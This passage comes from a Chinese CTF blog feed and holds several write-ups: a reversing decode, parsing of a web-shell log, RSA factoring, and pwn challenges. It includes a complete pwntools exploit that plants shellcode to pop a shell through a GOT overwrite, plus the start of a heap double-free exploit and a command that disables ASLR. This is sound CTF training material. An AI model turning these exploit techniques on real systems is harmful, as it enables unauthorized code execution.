class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">unsigned char enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  0x76, 0x73, 0x85, 0x75, 0x86, 0x78, 0xAD, 0x6B, 0x97, 0x68, </span><br><span class="line">  0x98, 0x67, 0x64, 0x64, 0x62, 0x97, 0x68, 0x98, 0x6B, 0x6B, </span><br><span class="line">  0x96, 0x67, 0x62, 0x69, 0x95, 0x96, 0x65, 0x96, 0x6A, 0x69, </span><br><span class="line">  0x69, 0x65, 0x66, 0x97, 0x68, 0x98, 0x6A, 0x95, 0x68, 0xAF, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">for (int i = 0; i &lt;= 39; ++i )&#123;</span><br><span class="line">enc[i]-=50;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s&quot;,enc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h4><p>利用工具直接解</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="asoul-lover"><a href="#asoul-lover" class="headerlink" title="asoul_lover"></a>asoul_lover</h4><p>结合题目描述及pdf信息搜集，压缩包密码直接解</p><h4 id="site-log"><a href="#site-log" class="headerlink" title="site_log"></a>site_log</h4><p>查看log，在evil.php所有一些命令。跑脚本跑出所有。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;my_site.log&#x27;</span></span><br><span class="line">p = <span class="string">&#x27;vil.php\?attack=(.*) HTTP/1.1&#x27;</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = f.readline()</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            out = re.findall(p, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> out:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s.append(out[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        f.write(<span class="built_in">str</span>(i + <span class="string">&quot;\n&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后打印看看哪些有用的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">115</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">100</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">47</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">115</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">119</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">122</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">122</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">45</span>), <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">80</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">104</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">50</span>), <span class="built_in">chr</span>(<span class="number">51</span>), <span class="built_in">chr</span>(<span class="number">51</span>), <span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">73</span>), <span class="built_in">chr</span>(<span class="number">103</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">114</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">65281</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>), <span class="built_in">chr</span>(<span class="number">46</span>), <span class="built_in">chr</span>(<span class="number">122</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">34</span>), <span class="built_in">chr</span>(<span class="number">73</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">65</span>), <span class="built_in">chr</span>(<span class="number">77</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">82</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">79</span>), <span class="built_in">chr</span>(<span class="number">79</span>), <span class="built_in">chr</span>(<span class="number">84</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">34</span>)</span><br><span class="line">      )</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z i p   - r P   h e h e h e 2 3 3 _ I g o t r o o t ！   f l a g . z i p</span><br></pre></td></tr></table></figure><p>拿到压缩包密码，结束。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本次比赛最终rank21，幸而拿到省赛一等奖最后一名。pwn题签到拿下二血，re签到拿下还是好的，但是pwn少拿了一道有点可惜。最终还是靠学长ak web才拿下的省一，希望学长明年还能带我。下面放出本次比赛提交的wp，misc和cry因为没有留下图片(就是wps复制过来的，导出pdf之后交了，后面word删了图片也就没了)。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>lctf2016_pwn200 writeup</title>
    <link href="http://example.com/2021/10/27/lctf2016_pwn200%20writeup/"/>
    <id>http://example.com/2021/10/27/lctf2016_pwn200%20writeup/</id>
    <published>2021-10-27T03:00:00.000Z</published>
    <updated>2021-11-11T13:03:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录-<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a></p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec 64位保护全关，并且栈可读可写可执行，那么主要思路应该是执行shellcode了。main函数一个IO初始化和一个函数，进去发现有一个name输入，是用for - read(1)实现的，但是观察缓冲区和循环大小，发现缓冲区大小与循环次数相同，意味着如果我输入填满缓冲区，一会输出名字的时候可以泄露栈地址。sub_4007DF这个函数就是输入一个3位数值返回int。继续往下看发现它又有一个与缓冲区大小相等的一次输入，并且可以覆盖到char *dest这个指针变量，一会会将整个缓冲区以字符串形式拷贝到那个指针内的地址中。那么如果我们将ptr修改那基本是任意地址写了，加上之前泄露的站地址便可以在上面执行shellcode，但是同时也有限制，那就是这是一个字符串拷贝，如果需要在返回的时候执行shellcode那么需要填上shellcode后先放上一个jmp rsp的地址。而64位程序地址虽占8个字节但是实际高两个字节一般都是空的，后面的shellcode很可能无法拷贝。我还尝试过栈迁移，但是栈迁移需要改连续的两个为地址，也不能连续拷贝。那么可以尝试劫持got表，让它在后面执行某些函数的时候劫持到栈上面的shellcode里面。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>主要就是写在got表的地址要确定是shellcode的地址，这个可以通过自己调试去反复确定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27025</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">48</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">120</span>-<span class="number">0x28</span>-<span class="number">32</span>+<span class="number">8</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))<span class="comment">#+120</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id&#x27;</span>,<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line">payload=p64(stack_addr)+asm(shellcraft.sh())</span><br><span class="line">payload=payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;~&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400a8d&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录-&lt;a href=&quot;https://buuoj.cn/challenges#lctf2016_pwn200&quot;&gt;lctf2016_pwn200&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>2021江西省赛RSA writeup</title>
    <link href="http://example.com/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/"/>
    <id>http://example.com/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/</id>
    <published>2021-10-27T02:00:00.000Z</published>
    <updated>2021-11-11T13:03:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>来源于一位师傅发的RSA的题目，这题正解是套公式，但是其实可以直接分解n。</p><p>题来康康别的师傅发给我的江西省赛的cry题，发现自己还是能很好的运用一些小技巧的，正解虽然不用分解n，但是咱还是可以分解n的hhh</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span></span><br><span class="line">p-q=<span class="number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span></span><br></pre></td></tr></table></figure><p>题目给了n和密文，还给了p和q的关系式，但是n是600多位十进制数直接分解不太现实，即便确定了p和q的位数复杂度也不允许。而且它数据刚刚好，python无法直接表示，所以我们就很难用python写这个分解n的脚本。这里有一个很好用的东西：java大数，java大数是字符串封装的可以运算的数，那么我们就可以通过这个很好的运算了。</p><p>既然直接分析不可行的话那么采取其它策略——爆破</p><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>思想是确定p的位数，然后q=p+x，从高位枚举，直到p*(p+x)刚好&lt;n确定这一位数，就算p是300多位，每位枚举10中情况复杂度也不算高，那么这个就用java写脚本爆破了。</p><p>首先确定一下p的位数，这个很难简单，直接随便取若干位数为p，再算(p+x)*p与n相除，若得出来的值不超过10那基本就是这么多位数了，这里算出来位数是310位</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.math.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bignumber</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        BigInteger n = <span class="keyword">new</span> BigInteger(<span class="string">&quot;27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603&quot;</span>);</span><br><span class="line">        BigInteger x = <span class="keyword">new</span> BigInteger(<span class="string">&quot;3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858&quot;</span>);</span><br><span class="line">        BigInteger i = <span class="keyword">new</span> BigInteger(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">310</span>;j&gt;=<span class="number">1</span>;j--) &#123;</span><br><span class="line">        String s=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;j-<span class="number">1</span>;k++) &#123;</span><br><span class="line">        s+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        BigInteger pow=<span class="keyword">new</span> BigInteger(s);</span><br><span class="line">        <span class="comment">//System.out.println(pow);</span></span><br><span class="line">        <span class="keyword">int</span> bit=<span class="number">10</span>;</span><br><span class="line">        BigInteger p=<span class="keyword">new</span> BigInteger(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">        bit--;</span><br><span class="line">        BigInteger m=pow.multiply(<span class="keyword">new</span> BigInteger(Integer.toString(bit)));</span><br><span class="line">        BigInteger a=m.add(i);</span><br><span class="line">        p=a.multiply(a.add(x));</span><br><span class="line">        &#125;<span class="keyword">while</span>(n.compareTo(p)==-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//System.out.println(bit);</span></span><br><span class="line">        i=i.add(pow.multiply(<span class="keyword">new</span> BigInteger(Integer.toString(bit))));</span><br><span class="line">        System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/1.png" alt="1"></p><p>很容易就爆破出来了，最终得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">164388402596326998398734266483348689718634308613134769513823133531277866932924580863368129180110157251658299906566819446945741582875064595447688991363818514760290461718304500609014489162133123761201603375706506435381197548902899274601380329856241471126508515906897368912158915277705061990280370468267906281833</span></span><br></pre></td></tr></table></figure><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span></span><br><span class="line">p=<span class="number">164388402596326998398734266483348689718634308613134769513823133531277866932924580863368129180110157251658299906566819446945741582875064595447688991363818514760290461718304500609014489162133123761201603375706506435381197548902899274601380329856241471126508515906897368912158915277705061990280370468267906281833</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span></span><br><span class="line">x=<span class="number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span></span><br><span class="line">q=p+x</span><br><span class="line"></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag=long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/2.png" alt="2"></p><p>得到flag=flag{9c0532a253809f180747b6da334b438f}</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;来源于一位师傅发的RSA的题目，这题正解是套公式，但是其实可以直接分解n。&lt;/p&gt;
&lt;p&gt;题来康康别的师傅发给我的江西省赛的cry题，发现自己还是能很好的运用一些小技巧的，正解虽然不用分解n，但是咱还是可以分解n的hhh&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>2020浙江省赛 pwn2 writeup</title>
    <link href="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/"/>
    <id>http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/</id>
    <published>2021-10-26T02:00:00.000Z</published>
    <updated>2021-11-11T13:03:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>国庆复的盘，今天补一下</p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec保护全开。</p><p>经典菜单题，没有去符号表，查看menu函数发现只有添加和删除操作，但是可以发现删除操作是通过函数指针实现的。并且分little 和 big的区别，free little就是一个free，free big 就是要把那个堆块里面的内容指向的堆块free了还要把本身给free，但是指针并没有清零。造成了UAF漏洞，并且在add的时候根据字符串长度来分配大小，并且会先读栈上，然后在strcpy拷贝，这就意味着输入不能存在\0。并且你输入的size只跟你输入大小有关，它拷贝分配的大小还是用strlen算出来长度再malloc然后strcpy，这一波操作下来就没办法溢出操作，并且由于\0截断也限制了很多。开了PIE无法unlink，和用got表泄露libc，而泄露程序基址也是比较难的(虽然正解是泄露程序基址的awa)。</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>考虑劫持函数指针，直接覆盖部分来修改函数，发现freebig和freelittle函数指针都在堆上面，由于只有最后三位相同，而我们覆盖是以字节为单位的，在调试可以选择先关了ASLR，让它在确定位置上加载不妨碍调试，出了之后也就需要爆破这半个字节十六分之一的概率还是比较可观的。但是我的电脑不知道为什么特殊一点的，它程序加载的基址末五位都是0，那这样我调试就更加方便了，直接写上两个字节过去就完事了。如果你的你的机子没有这个特性可以参考以下操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo su</span><br><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>这一波操作之后会让程序和libc在确定的基址上运行，这样如果需要爆破，调试起来就更方便了，我的机子重启之后这个默认变回2的好像。</p><p>那么我们就先用double free的方式将堆块申请到伪造的区域造成堆重叠覆盖指针区域为printf，至于为什么printf呢，那是因为可以用%p泄露栈或寄存器上的变量，栈上面或多或少都会有libc的地址存在的。</p><p>那我们先添加五组堆块</p><p>第一个堆块：big ，在数据区域伪造出一个0x31大小的堆块一遍等会申请。</p><p>第二个堆块：big，把它的size区域变成0x31以便等会申请。</p><p>第三个堆块：small，用于double free 的堆块</p><p>第四个堆块：small，用于double free 的堆块</p><p>第五个堆块：small，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#交互函数会在最后完整的exp中给出</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span 